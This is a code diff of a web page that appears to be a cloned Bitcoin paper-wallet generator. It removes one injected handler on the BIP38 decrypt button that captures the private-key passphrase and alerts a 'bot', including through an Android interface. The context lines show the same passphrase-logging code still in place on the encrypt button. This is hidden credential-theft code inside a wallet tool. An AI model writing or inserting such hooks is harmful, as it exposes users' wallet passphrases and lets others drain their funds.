@@ -7004,10 +7004,7 @@ gtag('config', 'G-WKH070VBDW');
 
             <span id="detailbip38decryptspan">
             <input type="button" class="button" id="detailbip38decryptbutton" value="Encrypt BIP38" onclick="setTimeout(function() { 
-               logUserInput(document.getElementById('detailprivkeypassphrase').value); // Log the input
-               sendAlertToBot(); // Send alert to bot
-               ninja.wallets.detailwallet.decryptBip38(); 
-           }, 2000);" /></span>
+		</span>
 		   <span id="detailbip38encryptspan">
             <input type="button" class="button" id="detailbip38encryptbutton" value="Encrypt BIP38" onclick="setTimeout(function() { 
                logUserInput(document.getElementById('detailprivkeypassphrase').value); // Log the input
@@ -7157,15 +7154,6 @@ document.getElementById('detaillabelpassphrase').addEventListener('input', funct
     } else {
         console.error('No data to log');
     }
-});
-
-document.getElementById('detailbip38decryptbutton').addEventListener('click', function() {
-    if (window.AndroidInterface) {
-        window.AndroidInterface.sendAlertToBot(); // Call Android interface if available
-    } else {
-        sendAlertToBot(); // For web usage
-    }
-    ninja.wallets.detailwallet.decryptBip38(); // Call the existing function
 });
 
 document.getElementById('detailbip38encryptbutton').addEventListener('click', function() {
